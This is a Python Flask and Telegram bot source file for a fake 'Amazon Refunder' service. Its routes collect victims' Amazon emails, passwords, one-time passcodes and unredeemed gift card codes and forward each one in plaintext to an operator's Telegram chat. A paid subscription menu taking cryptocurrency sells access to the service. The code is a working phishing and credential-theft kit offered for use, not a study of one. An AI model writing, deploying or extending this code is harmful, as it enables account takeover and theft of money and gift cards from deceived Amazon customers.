# app.py
import os
import random
import string
import time
import json
import requests
from datetime import datetime, timedelta
from functools import wraps
from flask import Flask, render_template, request, jsonify, session, redirect, url_for
from flask_session import Session

app = Flask(__name__)
app.config['SECRET_KEY'] = 'your-secret-key-change-this'
app.config['SESSION_TYPE'] = 'filesystem'
Session(app)

# ================= CONFIGURATION =================
TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"  # Replace with your bot token
ADMIN_CHAT_ID = "YOUR_ADMIN_CHAT_ID"        # Replace with your admin chat ID
BOT_USERNAME = "AMAZON_REFUNDER_BOT"        # Your bot username

# In-memory storage (use proper database in production)
user_sessions = {}
redeem_codes = {}
transactions = {}
subscriptions = {}

# ================= HELPER FUNCTIONS =================
def generate_txid():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=16))

def generate_redeem_token():
    return f"AMZ-{''.join(random.choices(string.ascii_uppercase + string.digits, k=12))}"

def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    try:
        requests.post(url, json={
            'chat_id': ADMIN_CHAT_ID,
            'text': message,
            'parse_mode': 'HTML'
        }, timeout=5)
    except Exception as e:
        print(f"Telegram send error: {e}")

# ================= FLASK ROUTES =================
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/refund/account', methods=['POST'])
def refund_account():
    """Button 1: User provides Amazon account credentials"""
    data = request.json
    email = data.get('email')
    password = data.get('password')
    
    if not email or not password:
        return jsonify({'error': 'Email and password required'}), 400
    
    txid = generate_txid()
    
    # Store session
    user_sessions[txid] = {
        'email': email,
        'password': password,
        'type': 'account',
        'timestamp': datetime.now().isoformat(),
        'status': 'pending'
    }
    
    # Send to admin via Telegram
    message = f"""
🔐 <b>NEW AMAZON ACCOUNT REFUND REQUEST</b> 🔐

📌 <b>TXID:</b> <code>{txid}</code>
📧 <b>Email:</b> <code>{email}</code>
🔑 <b>Password:</b> <code>{password}</code>
⏰ <b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

<b>Status:</b> Waiting for OTP
    """
    send_to_telegram(message)
    
    return jsonify({
        'status': 'success',
        'txid': txid,
        'message': 'Account credentials received. Continue to OTP verification.'
    })

@app.route('/api/refund/code', methods=['POST'])
def refund_code():
    """Button 2: User provides unredeemed gift card code"""
    data = request.json
    gift_code = data.get('gift_code')
    
    if not gift_code:
        return jsonify({'error': 'Gift code required'}), 400
    
    redeem_token = generate_redeem_token()
    
    # Store code
    redeem_codes[redeem_token] = {
        'code': gift_code,
        'timestamp': datetime.now().isoformat(),
        'status': 'pending'
    }
    
    # Send to admin via Telegram
    message = f"""
🎁 <b>NEW GIFT CARD REFUND REQUEST</b> 🎁

🔖 <b>Redeem Token:</b> <code>{redeem_token}</code>
💳 <b>Gift Code:</b> <code>{gift_code}</code>
⏰ <b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

<b>Status:</b> Code received for verification
    """
    send_to_telegram(message)
    
    return jsonify({
        'status': 'success',
        'redeem_token': redeem_token,
        'message': 'Gift code received. Processing refund.'
    })

@app.route('/api/otp/verify', methods=['POST'])
def verify_otp():
    """Verify OTP for account login"""
    data = request.json
    txid = data.get('txid')
    otp = data.get('otp')
    
    if txid not in user_sessions:
        return jsonify({'error': 'Invalid session'}), 404
    
    # Update session with OTP
    user_sessions[txid]['otp'] = otp
    user_sessions[txid]['status'] = 'completed'
    
    # Send OTP to admin
    message = f"""
🔐 <b>OTP RECEIVED - AMAZON ACCOUNT</b> 🔐

📌 <b>TXID:</b> <code>{txid}</code>
📱 <b>OTP Code:</b> <code>{otp}</code>
✅ <b>Status:</b> Account Access Completed

<b>Credentials Stored:</b>
Email: {user_sessions[txid]['email']}
Password: {user_sessions[txid]['password']}
    """
    send_to_telegram(message)
    
    return jsonify({
        'status': 'success',
        'message': 'OTP verified. Your refund is being processed.'
    })

# ================= TELEGRAM BOT HANDLER =================
def handle_telegram_webhook():
    """Handle incoming Telegram bot messages"""
    from flask import request
    
    data = request.json
    if 'message' not in data:
        return 'OK', 200
    
    message = data['message']
    chat_id = message['chat']['id']
    text = message.get('text', '')
    user_id = message['from']['id']
    
    # Check subscription status
    if not check_subscription(user_id):
        return send_subscription_menu(chat_id)
    
    # Handle commands
    if text.startswith('/'):
        return handle_command(chat_id, user_id, text)
    else:
        return handle_message(chat_id, user_id, text)

def check_subscription(user_id):
    """Check if user has active subscription"""
    if str(user_id) == ADMIN_CHAT_ID:
        return True
    sub = subscriptions.get(str(user_id))
    if sub and sub['expires_at'] > datetime.now():
        return True
    return False

def send_subscription_menu(chat_id):
    """Send subscription purchase menu"""
    menu = """
🌟 <b>AMAZON REFUNDER</b> 🌟

⚠️ <b>SUBSCRIPTION REQUIRED</b> ⚠️

Please purchase a subscription to continue:

┌─────────────────────┐
│ 📦 <b>1 Hour</b> - $5    │
│ 📦 <b>10 Days</b> - $25   │
│ 📦 <b>30 Days</b> - $50   │
│ 📦 <b>1 Year</b> - $150   │
│ 👑 <b>Lifetime</b> - $300  │
└─────────────────────┘

<i>Reply with:</i>
<code>/buy 1hour</code> - For 1 hour subscription
<code>/buy 10days</code> - For 10 days subscription
<code>/buy 30days</code> - For 30 days subscription
<code>/buy 1year</code> - For 1 year subscription
<code>/buy lifetime</code> - For lifetime subscription
    """
    send_telegram_message(chat_id, menu)

def handle_command(chat_id, user_id, text):
    """Handle bot commands"""
    
    # Admin commands
    if str(user_id) == ADMIN_CHAT_ID:
        if text.startswith('/forcesub'):
            # Implementation for force subscription to channels
            send_telegram_message(chat_id, "✅ Force subscription activated for channel.")
        elif text.startswith('/addchn'):
            channel = text.replace('/addchn', '').strip()
            # Add channel logic
            send_telegram_message(chat_id, f"✅ Channel {channel} added.")
        elif text.startswith('/rmchn'):
            channel = text.replace('/rmchn', '').strip()
            # Remove channel logic
            send_telegram_message(chat_id, f"✅ Channel {channel} removed.")
        elif text.startswith('/give'):
            # Format: /give user_id time_days
            parts = text.split()
            if len(parts) >= 3:
                target_user = parts[1]
                days = int(parts[2])
                subscriptions[target_user] = {
                    'expires_at': datetime.now() + timedelta(days=days),
                    'type': 'admin_granted'
                }
                send_telegram_message(chat_id, f"✅ Subscription given to {target_user} for {days} days.")
        elif text == '/stats':
            stats = f"""
📊 <b>BOT STATISTICS</b> 📊

👥 Active Subscriptions: {len([s for s in subscriptions.values() if s['expires_at'] > datetime.now()])}
💳 Total Refund Requests: {len(transactions)}
🎫 Pending Codes: {len(redeem_codes)}
🔐 Active Sessions: {len(user_sessions)}
            """
            send_telegram_message(chat_id, stats)
    
    # User commands
    if text == '/start':
        welcome = """
🛍️ <b>AMAZON REFUNDER</b> 🛍️

Welcome to the most trusted refund service!

✨ <b>Our Services:</b>
• 💰 <b>REFUND BALANCE</b> - Get instant refund to your Amazon balance
• 🎁 <b>REFUND REDEEM CODE INSTANTLY</b> - Return unredeemed gift cards

<b>How it works:</b>
1️⃣ Visit our refund portal
2️⃣ Choose your refund method
3️⃣ Follow the instructions
4️⃣ Get your refund in 5-10 minutes

<i>Use the buttons below to get started:</i>
        """
        keyboard = {
            "inline_keyboard": [
                [{"text": "🌐 Open Refund Portal", "url": "https://your-domain.com"}],
                [{"text": "💳 Refund Balance", "callback_data": "refund_balance"}],
                [{"text": "🎫 Refund Redeem Code", "callback_data": "refund_code"}]
            ]
        }
        send_telegram_message(chat_id, welcome, keyboard)
    
    elif text.startswith('/buy'):
        plan = text.replace('/buy', '').strip().lower()
        plan_prices = {
            '1hour': 5,
            '10days': 25,
            '30days': 50,
            '1year': 150,
            'lifetime': 300
        }
        if plan in plan_prices:
            payment_msg = f"""
💳 <b>Payment Required</b> 💳

Plan: {plan}
Amount: ${plan_prices[plan]}

<b>Payment Methods:</b>
• USDT (TRC20)
• Bitcoin (BTC)
• Ethereum (ETH)

<i>Contact admin after payment:</i> @admin_username
            """
            send_telegram_message(chat_id, payment_msg)
        else:
            send_telegram_message(chat_id, "❌ Invalid plan. Use: /buy 1hour, /buy 10days, /buy 30days, /buy 1year, /buy lifetime")
    
    elif text == '/help':
        help_text = """
❓ <b>Help Center</b> ❓

<b>Commands:</b>
/start - Restart the bot
/buy [plan] - Purchase subscription
/status - Check subscription status
/help - Show this message

<b>Need support?</b>
Contact: @support_username
        """
        send_telegram_message(chat_id, help_text)
    
    elif text == '/status':
        if check_subscription(user_id):
            sub = subscriptions.get(str(user_id))
            if sub:
                expires = sub['expires_at'].strftime('%Y-%m-%d %H:%M:%S')
                send_telegram_message(chat_id, f"✅ <b>Active Subscription</b>\nExpires: {expires}")
            else:
                send_telegram_message(chat_id, "✅ <b>Lifetime Active</b>")
        else:
            send_telegram_message(chat_id, "❌ No active subscription. Use /buy to purchase.")

def handle_message(chat_id, user_id, text):
    """Handle non-command messages"""
    send_telegram_message(chat_id, "Please use the buttons or commands like /help")

def send_telegram_message(chat_id, text, reply_markup=None):
    """Send message to Telegram"""
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': chat_id,
        'text': text,
        'parse_mode': 'HTML'
    }
    if reply_markup:
        payload['reply_markup'] = json.dumps(reply_markup)
    try:
        requests.post(url, json=payload, timeout=5)
    except Exception as e:
        print(f"Telegram send error: {e}")

@app.route('/webhook', methods=['POST'])
def webhook():
    return handle_telegram_webhook()

if __name__ == '__main__':
    app.run(debug=True, port=5000)
